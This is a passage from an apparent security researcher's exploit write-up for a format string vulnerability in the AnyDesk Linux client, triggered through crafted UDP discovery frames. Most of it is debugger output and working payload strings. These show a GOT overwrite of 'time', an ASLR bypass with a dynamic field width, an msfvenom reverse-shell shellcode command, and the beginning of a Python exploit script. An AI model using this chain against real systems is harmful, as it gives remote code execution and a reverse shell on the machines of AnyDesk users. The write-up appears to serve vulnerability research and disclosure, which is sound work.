Within the `reg_save_area` there are only 4 values we can access. These do obviously not contain any data of our input. All following parameters are stored in the `overflow_arg_area`. Let’s have a look at the first 50 values stored there using the `telescope` command:

```

gdb-peda$ telescope 0x00007ffffffeb970 50
0000| 0x7ffffffeb970 --> 0xb366d8 --> 0x62696c67 ('glib')
0008| 0x7ffffffeb978 --> 0x0
0016| 0x7ffffffeb980 --> 0x1530801 --> 0xe000007ffff17853
0024| 0x7ffffffeb988 --> 0x7ffff5e4ee24 (test   eax,eax)
0032| 0x7ffffffeb990 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0040| 0x7ffffffeb998 --> 0x0
0048| 0x7ffffffeb9a0 --> 0x10
0056| 0x7ffffffeb9a8 --> 0x7ffff5e501cd (<g_logv+605>:	mov    eax,r14d)
0064| 0x7ffffffeb9b0 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0072| 0x7ffffffeb9b8 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0080| 0x7ffffffeb9c0 --> 0x1fffeb9d0
0088| 0x7ffffffeb9c8 --> 0x4342b0 (push   rbp)
0096| 0x7ffffffeb9d0 --> 0x0
0104| 0x7ffffffeb9d8 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0120| 0x7ffffffeb9e8 --> 0x0
0128| 0x7ffffffeb9f0 --> 0x155dd20 --> 0x7fffdc00f3d0 --> 0x1514300 --> 0x1513da0 --> 0x14d6e00 (--> ...)
0136| 0x7ffffffeb9f8 --> 0x0
0144| 0x7ffffffeba00 --> 0x500000000
0152| 0x7ffffffeba08 --> 0x7ffff5e9acd8 ("Invalid UTF-8 encoded text in name - not valid '%s'")
0160| 0x7ffffffeba10 --> 0x0
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0176| 0x7ffffffeba20 --> 0x7ffff5e969e1 --> 0x4600303262696c67 ('glib20')
...

```

We can see a few occurrences of the heap address of the format string. Although we control parts of the format string, we don’t control the address, which is what we would need to. Searching even further down the stack for possible data we can control does not yield anything useful. So it seems that we can’t control any data, which we can access with the format string. Is this already a dead end? Of course not!

Taking a look at the values above again, we can see that there are stack addresses stored on the stack. There are even stack addresses, which reference the area we can access. For example at offset `112` the stack address `0x7ffffffeba18` is stored, which corresponds to offset `168`:

```

...
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...

```

If we use the appropriate argument selector we can use this stack address to write to the area we can access. We can then use another argument selector to reference the data we wrote. The following picture visualizes the basic idea:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_06-1.png)

The problem here is that we cannot do this in a single call of `vsnprintf`. All referenced data is fetched **before** data is written by the `%n` format specifier. This means that the `%19$ln` would indeed overwrite the data on the stack, but the `%26$ln` would still evaluate to the old value, which was stored there. Accordingly we need two calls:

1. Store address of `time` `GOT` entry on the stack
2. Write to previously stored `GOT` entry address in order to control instruction pointer

As you may remember, the vulnerable call to `vsnprintf` is actually made twice for the very same format string. Though it turned out that the call path for both of these calls vary. Because of this also the stack layout varies. This means that an argument selector (e.g. `%26$ln`) on the first call will not reference the same value on the second call. We also need to keep in mind that we cannot change the format string in-between the two calls. If we e.g. use `%200$n` on the first call, to write the `GOT` address on the stack, we need to ensure that `%200$n` on the second call also references a writable address, because we trigger a segmentation fault otherwise. This is not only true for `%n` we use to store the `GOT` address but also for the second `%n`, we need to use in order to actually write to the `GOT` entry. Unfortunately there did not seem to be any values on the stack, which would fulfill these requirements.

Thus we need another approach. The first thing that came into my mind was to send two independent announcement frames. We need to trigger the vulnerability twice, so let’s just trigger it twice via the initial attack vector. Because of the duplicate call this actually results in four calls to `vsnprintf`. We still must ensure that the `%n` used on the respective first call also references a writable memory location on the associated second call, but since we only need to use one `%n` format specifier in each pair of calls, stack values can be found to fulfill this requirement.

Although the approach using two separate announcement frames seemed to work, I did not really like it. One reason for this is the duplicate call of `vsnprintf`. We must accept that the second call writes somewhere into memory even though it is not relevant for our exploit. Also the two announcement frames may interfere with legitimate announcement frames, which are sent in the same time window (the GUI gets updated only every 5 seconds). These aspects may reduce the reliability of the exploit.

While thinking about this and looking at the GUI another idea came into my mind:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

The GUI displays not only the hostname, but also the username. So far we triggered the vulnerability only by using the hostname. But the username should also be prone to this. Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %p', '\x85\xfeUSERNAME %p', 'ad', 'main')

```

After a few seconds the GUI updates and the breakpoint on the `vsnprintf` call is hit:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

Inspecting the format string (third parameter) we can see that the username indeed triggered the vulnerability. After continuing the execution the breakpoint is hit again:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

This time the vulnerability was triggered by the hostname. If we further continue the execution both calls (for username and hostname) are repeated.

Thus we verified that the vulnerability can be triggered using both the hostname and the username. This is a good news for our exploit because we can now use two independent format strings, which are sent in a single UDP packet and are both evaluated before the duplicate call is triggered.

What we have to do now is to find an accessible stack address, which we will write the `GOT` address to. For this we must keep in mind that the values on the stack between the two `vsnprintf` calls may change / get overwritten. If we write to an stack address, which is too near to the top of the stack, it is very likely that it has been overwritten at the time of the second call. Finding a suitable value is only a matter of try and error. We write to an address on the first call and then verify that the value we wrote is still the same on the second call.

The stack address `0x7ffffffebe70`, which can be accessed using the argument selector `%93$ln` fits our needs:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 2, 0x00000000008ab346 in ?? ()
gdb-peda$ telescope 0x00007ffffffeb970 100
...
0704| 0x7ffffffebc30 --> 0x7ffffffebe70 --> 0x6ffffec070
...

```

After the first call the value `0x90` (the characters written so far) is written to `0x7ffffffebe70`:

```

gdb-peda$ ni
...
[-------------------------------------code-------------------------------------]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
   0x8ab346:	call   0x412d90 <vsnprintf@plt>
=> 0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
   0x8ab35c:	call   0x4123d0 <gettimeofday@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000008ab34b in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

When the breakpoint is hit again on the second call, the value is still the same:

```

gdb-peda$ c
Continuing.
...
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2249 ('I"')
0008| 0x7ffffffeaaf8 --> 0x2bc
0016| 0x7ffffffeab00 --> 0x158c710 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbad94
0032| 0x7ffffffeab10 --> 0x5ecbad94
0040| 0x7ffffffeab18 --> 0xab240
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

On the second call we can access the value using the argument selector `%165$p` (offset `1280`):

```

gdb-peda$ telescope 0x00007ffffffeb970 200
...
1280| 0x7ffffffebe70 --> 0x90
...

```
## Controlling the instruction pointer

Now we are finally ready to overwrite the `GOT` entry of `time`. At first let’s determine the address of the `GOT` entry:

```

gdb-peda$ p/x &'time@got.plt'
$1 = 0x119ddc0

```

Accordingly the `GOT` entry of `time` is stored at `0x119ddc0`. In order to write this value, we can pad the output of `vsnprintf` accordingly using a `field width`. If you are not familiar with this, please refer to my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B). The error message itself (`Failed to set text from markup ...`) contains 133 characters. Also we need to add two characters for an invalid UTF-8 sequence. Thus we have to pad the output to `18472249` characters:

```

0x119ddc0 = 18472384 (time GOT)
18472384 - 133 - 2 = 18472249

```

Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %165$p', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After the first call to `vsnprintf` the target stack address (`0x7ffffffebe70`) actually contains the `GOT` address of `time`:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 52: Invalid UTF-8 encoded text in name - not valid '\205\376%18472249x%93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000006ffffec070
gdb-peda$ ni
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x000000000119ddc0

```

The `%165$p` format specifier on the second call successfully references the `GOT` address:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ ni
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME 0x119ddc0'"

```

The next step is to replace the `%p` format specifier with `%ln` in order to write a 8 byte value to the `GOT` entry on the second call. This way we should be able to control the instruction pointer, when the call to `time` is triggered after the `vsnprintf` call. Let’s verify this by writing the value `0x1337`:

```

0x1337 = 4919
4919 - 133 - 2 = 4784

```

This time we adjust the hostname accordingly:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%4784x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame and continuing to the second call to `vsnprintf`, to `GOT` entry of `time` is still untouched:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0008| 0x7ffffffeaaf8 --> 0x357
0016| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbb8cc
0032| 0x7ffffffeab10 --> 0x5ecbb8cc
0040| 0x7ffffffeab18 --> 0xd0f51
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

By executing the `vsnprintf` call the value `0x1337` is successfully written:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000000001337

```

If we now continue the execution, the immediately following call to `time` raises a segmentation fault with the instruction pointer being `0x1337`:

```

gdb-peda$ c
Continuing.

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x1338
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x0
RDX: 0x0
RSI: 0x7ffff1784ca0 --> 0x16c1400 --> 0x276e00 ('')
RDI: 0x7ffffffeab08 --> 0x5ecbb8cc
RBP: 0x5
RSP: 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
RIP: 0x1337
R8 : 0x1
R9 : 0x6e ('n')
R10: 0x1
R11: 0xa ('\n')
R12: 0x7ffffffeb898 --> 0x3000000018
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453ea0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x1337
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
0008| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0016| 0x7ffffffeaaf8 --> 0x357
0024| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0032| 0x7ffffffeab08 --> 0x5ecbb8cc
0040| 0x7ffffffeab10 --> 0x5ecbb8cc
0048| 0x7ffffffeab18 --> 0xd0f51
0056| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000001337 in ?? ()

```

We successfully control the instruction pointer.

## Hitting our shellcode: dynamic field width

At next we must decide where we want to point the instruction pointer to. At the very beginning we figured out, that the security mechanisms of the binary are quite weak. Actually the heap, where the format string we control is stored, is executable:

```

gdb-peda$ vmmap 0x1453ea0
Start              End                Perm	Name
0x011c4000         0x017c8000         rwxp	[heap]

```

This means that we can store a shellcode within the format string and redirect the instruction pointer to this shellcode. Though we need to keep in mind that we manually disabled ASLR and in fact don’t know any heap address. A common approach to bypass ALSR is to leak a memory address. Especially for basic format string vulnerabilities this is an easy to achieve goal. In this case however we don’t get any response from the application. The result of the format string is written to the log file, which we don’t have access to. Thus we cannot leak any heap address.

Nevertheless we can successfully bypass ASLR using a `dynamic field width`. Since this does not seem to be very well-known, let’s have a look at a short example. We have already used the ordinary `field width` in order to pad the output effectively increasing the amount of characters written, which makes `%n` write a bigger value:

```

user@w00d:~$ cat sample1.c
#include <stdio.h>

int main() {

  int out;
  printf("%100x%1$n", &out);
  printf("\nout = %d\n", out);

  return 0;
}

```

The `%100x` format specifier prints the first argument as a hexadecimal number, which is padded to 100 characters. Accordingly 100 characters are written. This amount will be written to the `out` variable by using the `%1$n` format specifier:

```

user@w00d:~$ ./sample1
                                                                                            ffffded4
out = 100

```

In this case the `field width` was statically set to `100`. But we can also use a `dynamic field width`:

```

user@w00d:~$ cat sample2.c
#include <stdio.h>

int main() {

  int out;
  int field_width = 123;
  printf("%1$*2$x%1$n", &out, field_width);
  printf("\nout = %d\n", out);

  return 0;
}

```

We introduced a new variable called `field_width`, which is passed as the second argument to `printf`. Also we changed the `%100x` format specifier to `%1$*2$x`. At first the syntax might look a little bit confusing, but actually it is quite simple: The `1$` at the beginning determines, which value we want to print. In this case we just take the first argument, just like the `%100x` did (4 byte of `out` address). This is separated by an asterisk (`*`) from the second part: `2$`. This determines which value should be used for the field width. In this case the variable `field_width`, which is the second argument. Accordingly when running the program the value of `field_width` (`123`) is written to the variable `out`:

```

user@w00d:~$ ./sample2
                                                                                                                   ffffded0
out = 123

```

After this short introduction to the dynamic field width, let’s see how we can leverage this feature.

When inspecting all accessible parameters on the second call to `vsnprintf` (hostname), we can see that we can access the heap address of the format string. The `reg_save_area` is stored at `0x00007ffffffeb8b0`. The value of `gp_offset` is `0x10`, which means the first argument we can access is stored at `0x00007ffffffeb8b0 + 0x10 = 0x00007ffffffeb8c0`:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x28e3
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa7
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1412190 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x28e3
0008| 0x7ffffffeaaf8 --> 0x1e6
0016| 0x7ffffffeab00 --> 0x158bf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbbcb0
0032| 0x7ffffffeab10 --> 0x5ecbbcb0
0040| 0x7ffffffeab18 --> 0x76cd1
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030
gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0
gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001412190	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

The first accessible argument at `0x00007ffffffeb8c0` is actually the heap address of the format string (`0x0000000001412190`). If we use this address as a `dynamic field width`, we can actually write its value to the `time` `GOT` entry.

By changing the hostname to the following value, we write the heap address + the amounts of characters written so far (error message and two bytes invalid UTF-8 sequence) to the `time` `GOT` entry:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame we continue to the second call. The `GOT` entry is still untouched:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x2db9
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0x21 ('!')
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1570630 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2db9
0008| 0x7ffffffeaaf8 --> 0x9d
0016| 0x7ffffffeab00 --> 0x158df10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbc775
0032| 0x7ffffffeab10 --> 0x5ecbc775
0040| 0x7ffffffeab18 --> 0x26709
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

After executing the call the `GOT` entry contains the heap address `0x00000000015706b7`:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00000000015706b7

```

The `%n` wrote the field width (the heap address of the format string `0x1570630`) + the characters written so far. The resulting address (`0x00000000015706b7`) references the beginning of our format specifier:

```

gdb-peda$ x/s 0x00000000015706b7
0x15706b7:	"%1$*1$x%165$ln'"

```

Since we want to make the address point to actual shellcode, which we can append to the format string, we further need to add a little bit of padding. The following hostname adds another `18` characters of padding (`%18x`) and a dummy shellcode (`0xcc`):

```

shellcode = '\xcc'
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

Now the `GOT` entry is overwritten with the address of the shellcode:

```

...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000001379549

gdb-peda$ x/i 0x0000000001379549
   0x1379549:	int3

```
## Final exploit

Finally it is time to generate a real payload:

```

kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
...

```

Please notice the bad bytes. `0x00` is excluded to prevent the string from being terminated. `0x25` (`%`) would introduce another format specifier and `0x26` (`&`) is used by glib and must also be avoided.

The final exploit script looks like this:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

shellcode =  b""
